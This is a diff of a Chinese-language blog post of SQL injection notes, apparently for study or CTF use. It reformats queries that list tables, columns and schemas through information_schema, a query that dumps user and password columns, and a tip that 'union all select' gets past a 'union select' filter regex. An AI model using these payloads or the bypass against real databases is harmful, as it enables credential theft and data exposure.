@@ -7,33 +7,38 @@ categories:
 abbrlink: 41083
 date: 2018-03-21 09:26:16
 ---
+# 通用注入语句:
+
 - 表名
 
-  ```mysql
-  select group_concat(distinct table_name) from information_schema.tables where table_schema=database()
-  ```
+```
+select group_concat(distinct table_name) from information_schema.tables where table_schema=database()
+```
 
 
 - 列名
 
-  ```mysql
-  select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]
-  ```
+```
+select group_concat(distinct column_name) from information_schema.columns where table_name=[16进制|`table_name`]
+```
 
 
 - 数据库
 
-  ```mysql
-  select group_concat(schema_name) from information_schema.schemata
-  ```
+```
+select group_concat(schema_name) from information_schema.schemata
+```
+
 
 - 表内容
+```
+select 1,concat(user, 0x2c, password) from [table_name]
+```
 
-  ```mysql
-  select 1,concat(user, 0x2c, password) from [table_name]
-  ```
 
-  ​
+
+# 运算符优先级：
+
 ```
 优先级 运算符
 (最高)  !
@@ -55,9 +60,11 @@ date: 2018-03-21 09:26:16
 
 # union select 不允许同时出现
 过滤正则表达式如下:
-<code>	
+
+```
 union[\s\xA0]+select
-</code><br/>
+```
+
 可以使用union all select绕过
 
 # select过滤
